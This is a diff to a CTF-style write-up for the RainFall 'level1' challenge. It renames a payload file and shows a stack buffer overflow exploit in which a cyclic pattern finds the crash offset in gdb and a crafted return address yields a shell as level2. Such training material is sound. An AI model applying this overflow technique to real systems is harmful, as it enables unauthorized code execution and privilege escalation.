@@ -87,10 +87,10 @@ aa0aa1aa2aa3aa4aa5aa6aa7aa8aa9ab0ab1ab2ab3ab4ab5ab6ab7ab8ab9ac0ac1ac2ac3ac4ac5ac
 ...
 ```
 ```sh
-level1@RainFall:~$ python -c 'print "aa0aa1aa2aa3aa4aa5aa6aa7aa8aa9ab0ab1ab2ab3ab4ab5ab6ab7ab8ab9ac0ac1ac2ac3ac4ac5ac6ac7ac8ac"' > /tmp/exploit
+level1@RainFall:~$ python -c 'print "aa0aa1aa2aa3aa4aa5aa6aa7aa8aa9ab0ab1ab2ab3ab4ab5ab6ab7ab8ab9ac0ac1ac2ac3ac4ac5ac6ac7ac8ac"' > /tmp/exploit1
 level1@RainFall:~$ gdb level1
-(gdb) r < /tmp/exploit
-Starting program: /home/user/level1/level1 < /tmp/exploit
+(gdb) r < /tmp/exploit1
+Starting program: /home/user/level1/level1 < /tmp/exploit1
 
 Program received signal SIGSEGV, Segmentation fault.
 0x63613563 in ?? ()
@@ -112,8 +112,8 @@ Dump of assembler code for function run:
 in this case also, we need convert the address by little endian form,
 ```...ac4a\x44\x84\x04\x08```
 ```sh
-level1@RainFall:~$ python -c 'print "aa0aa1aa2aa3aa4aa5aa6aa7aa8aa9ab0ab1ab2ab3ab4ab5ab6ab7ab8ab9ac0ac1ac2ac3ac4a\x44\x84\x04\x08"' > /tmp/exploit
-level1@RainFall:~$ cat /tmp/exploit - | ./level1
+level1@RainFall:~$ python -c 'print "aa0aa1aa2aa3aa4aa5aa6aa7aa8aa9ab0ab1ab2ab3ab4ab5ab6ab7ab8ab9ac0ac1ac2ac3ac4a\x44\x84\x04\x08"' > /tmp/exploit1
+level1@RainFall:~$ cat /tmp/exploit1 - | ./level1
 Good... Wait what?
 whoami
 level2
